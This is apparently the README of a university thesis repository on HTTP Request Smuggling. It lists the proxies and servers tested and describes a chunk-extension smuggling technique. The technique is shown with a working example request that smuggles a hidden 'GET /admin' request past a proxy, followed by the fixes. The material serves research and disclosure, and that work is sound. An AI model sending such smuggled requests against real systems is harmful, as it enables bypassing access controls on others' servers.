
### [Quick link to research](https://kth.diva-portal.org/smash/get/diva2:1596031/FULLTEXT01.pdf)

# Bachelor's thesis on HTTP Request Smuggling

During the spring of 2021, we (Mattias Grenfeldt and Asta Olofsson) wrote our bachelor's thesis in Computer Science at KTH Royal Institute of Technology in Sweden. We studied HTTP Request Smuggling. The thesis can be found [here](https://urn.kb.se/resolve?urn=urn:nbn:se:kth:diva-302371).

You can find the code for the test harness used in `/test-harness` and you can find the requests used to search for bugs with in `/requests`.

## IEEE EDOC 2021 paper

The bachelor's thesis was later rewritten into a conference paper with the help of Viktor Engström, and Robert Lagerström. The paper was submitted to [IEEE EDOC 2021](https://ieee-edoc.org/2021/) and got accepted.

## Systems investigated

Here is the de-anonymization of the systems we investigated:

- P1 - [Apache HTTP Server (httpd)](http://httpd.apache.org/)
- P2 - [Nginx](https://nginx.org/)
- P3 - [Apache Traffic Server](https://trafficserver.apache.org/)
- P4 - [HAProxy](http://www.haproxy.org/)
- P5 - [Traefik](https://traefik.io/)
- P6 - [Caddy](https://caddyserver.com/)
- S1 - [Gunicorn](https://gunicorn.org/)
- S2 - [Actix](https://actix.rs/)
- S3 - [Node.js](https://nodejs.org/en/)
- S4 - [Puma](https://puma.io/)
- S5 - [hyper](https://hyper.rs/)
- S6 - [Golang (net/http)](https://pkg.go.dev/net/http)

## Errata

After the thesis was published, we realized that we had interpreted the situation with `Transfer-Encoding: chunked` and HTTP version 1.0 incorrectly. It was very unclear what a correct interpretation was. So we opened an issue on the specification. [Here](https://github.com/httpwg/http-core/issues/879) is the discussion that followed. This resulted in a change in the specification.

## Chunk extensions technique

After the thesis was published, we discovered another HRS technique. It is in the EDOC paper however. As far as we know, this is a new technique. The technique uses chunk extensions. You can read more about them here:

- https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1
- https://www.rfc-editor.org/errata/eid4667

Here is how an example request with chunk extensions could look like:

```
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked
 
5 ; a=b
hello
0

```

We found a proxy which parses chunk extensions incorrectly. It reads the chunk size and then reads any character until it encounters a `\n`. It doesn't verify whether there was a CR before the LF.

This could be combined with many of the servers tested since most servers allow any characters as part of the extension (particularly LF) but read the line until they reach CRLF. So we arrive at the following attack (all lines are terminated by CRLF):

```
GET / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked
 
2;\nxx
4c
0

GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked
 
0
```

The proxy will see the two chunks:

```
xx
```
and:
```
0

GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked
 
```

While the server will only see one chunk:

```
4c
```

and another request after it.

The fix for the server is to parse the chunk extension according to the RFC and not allow LF characters in it. The fix for the proxy is to verify that there is a CRLF there.
